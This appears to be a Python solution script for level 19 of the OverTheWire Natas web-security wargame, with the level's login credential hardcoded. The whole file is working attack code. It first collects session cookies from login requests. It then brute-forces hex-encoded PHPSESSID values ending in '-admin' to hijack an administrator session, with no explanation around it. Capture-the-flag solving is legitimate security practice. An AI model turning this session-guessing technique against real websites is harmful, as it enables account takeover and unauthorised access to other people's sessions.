import requests

# Define the URL of the website
url = 'http://natas19.natas.labs.overthewire.org/'
auth_username = "natas19"
auth_password = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"

# Define the username and password
payload_username = 'useruser'
payload_password = 'passpass'

# Define the number of requests to send
num_requests = 3

# Create a session to persist cookies across requests
session = requests.Session()

# Send multiple requests
for i in range(0,num_requests):
    # Construct the payload with username and password as URI parameters
    payload = {'username': payload_username, 'password': payload_password}
    
    # Send the POST request with the payload
    response = session.post(url, params=payload, auth=(auth_username,auth_password))
    
    # Print the cookies received
    print(f"Cookies after request {i+1}:")
    for cookie in response.cookies:
        print(f"Cookie: {cookie.name} = {cookie.value}")
    print("-----------------------")
    session.cookies.clear()

test=''
padding='-admin'
padding = ''.join(hex(ord(c))[2:] for c in padding)
last_response = ''
for i in range(0,640):
    for s in str(i):
        test+=f"3{s}"
    test+=padding
    # print(test)
    session.cookies.set("PHPSESSID", test)
    r = session.get(url, auth=(auth_username,auth_password))
    if r.text != last_response:
        print(r.text)
    last_response = r.text
    test = ""
    session.cookies.clear()